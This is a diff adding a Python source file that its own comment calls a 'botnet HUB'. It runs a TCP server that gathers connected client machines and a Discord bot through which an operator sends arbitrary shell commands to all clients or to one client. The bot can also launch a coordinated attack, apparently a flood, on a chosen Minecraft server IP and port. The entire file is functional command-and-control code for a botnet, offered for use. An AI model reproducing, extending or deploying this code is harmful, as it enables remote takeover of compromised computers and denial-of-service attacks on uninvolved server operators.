@@ -1,0 +1,131 @@
+import socket, threading, discord, items, random, time
+from discord.ext import commands
+
+# botnet HUB
+
+bot = commands.Bot(command_prefix="$")
+bot.remove_command('help')
+
+# init server
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+# variables
+IP = "hided"
+PORT = 27361
+# bind
+server.bind((IP, PORT))
+server.listen(9999) # max clients
+
+# client list
+clients_ = list()
+clients_addr_ = list()
+class server_:
+    def init():
+        while True:
+            conn, addr = server.accept()
+            clients_.append(conn)
+            print(f"[!] New client: {addr}")
+            clients_addr_.append(str(addr).split("'")[1])
+    def check():
+        while True:
+            for client in clients_:
+                try: client.send("raw".encode())
+                except:
+                    try:
+                        clients_.remove(client)
+                    except: continue
+    def clients() -> int:
+        """Returns: len() of the clients | Total clients"""
+        return len(clients_)
+    def shell(cmd: str) -> bool:
+        """Sends shell command to all clients"""
+        if len(clients_) < 1: return False
+        for client in clients_:
+            #os.system(cmd.replace("clmd", "")) : deleted | poor code
+            try:
+                if cmd.startswith("shell"):
+                    cmd_ = cmd.replace("shell ", "")
+                else: cmd_ = cmd
+                client.settimeout(3)
+                client.send("!shell ".encode("UTF-8") + cmd_.encode())
+            except: clients_.remove(client)
+        return True
+    def shell_for_each(cmd: str, addr: str) -> bool:
+        """Sends shell command for specific user."""
+        if len(clients_) < 1 and len(clients_addr_) < 1: return False
+        for client in clients_:
+            try:
+                client.settimeout(3)
+                client.send(f"{addr}!shell ".encode("UTF-8") + cmd.encode())
+            except: clients_.remove(client)
+        return True
+    def attack(ip: str) -> bool:
+        """Starting attack from all clients to defined minecraft server IP:PORT (e.g. 127.0.0.1:25565)"""
+        if len(clients_) < 1: return False
+        for client in clients_:
+            if ip.startswith("attack"):
+                cmd_ = ip.replace("attack ", "")
+            else: cmd_ = ip
+            client.settimeout(3)
+            client.send("!attack ".encode("UTF-8") + cmd_.encode())
+
+class utils:
+    def list_to_str(args: list) -> str:
+        return ' '.join([str(arg) for arg in args])
+# start server thread
+server_thread = threading.Thread(target=server_.init)
+server_thread.setDaemon(True)
+server_thread.start()
+time.sleep(1)
+server_thread1 = threading.Thread(target=server_.check)
+server_thread1.setDaemon(True)
+server_thread1.start()
+
+def randomcolor():
+    return discord.Color.from_rgb(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+
+# TODO: discord bot | i done
+# TODO: control specific client
+@bot.event
+async def on_ready():
+    print('bot ready! {0.user}'.format(bot))
+
+@bot.command()
+async def help(ctx: commands.Context):
+    embed = discord.Embed(title="Help", color = randomcolor())
+    menu = items.MENU
+    for cmd_name, cmd_desc in menu.items(): embed.add_field(name=cmd_name, value=cmd_desc, inline=False)
+    await ctx.reply(embed=embed)
+
+@bot.command()
+async def clients(ctx: commands.Context):
+    embed = discord.Embed(title="Clients", description=f"🖥️ Total clients: {server_.clients()}", color = randomcolor())
+    await ctx.reply(embed=embed)
+
+@bot.command()
+async def attack(ctx: commands.Context, ip: str):
+    embed = discord.Embed(title="Started", description=f"✅ Started attack on: {server_.clients()} clients!", color = randomcolor())
+    await ctx.reply(embed=embed)
+    server_.attack(ip=ip)
+
+@bot.command()
+async def shell(ctx: commands.Context, *, cmd: str):
+    embed = discord.Embed(title="Executed", description=f"✅ Command executed on: {server_.clients()} clients!", color = randomcolor())
+    await ctx.reply(embed=embed)
+    server_.shell(cmd=cmd)
+
+@bot.command()
+async def clientsid(ctx: commands.Context):
+    embed = discord.Embed(title="Clients", color = randomcolor())
+    for client in clients_addr_:
+        addr = str(client)
+        embed.add_field(name="🖥️ Client", value=addr)
+    await ctx.reply(embed=embed)
+
+@bot.command()
+async def shell_to(ctx: commands.Context, addr: str, *, cmd: str):
+    embed = discord.Embed(title="Executed", description=f"✅ Command executed!", color = randomcolor())
+    await ctx.reply(embed=embed)
+    server_.shell_for_each(cmd, addr)
+
+bot.run(items.TOKEN)
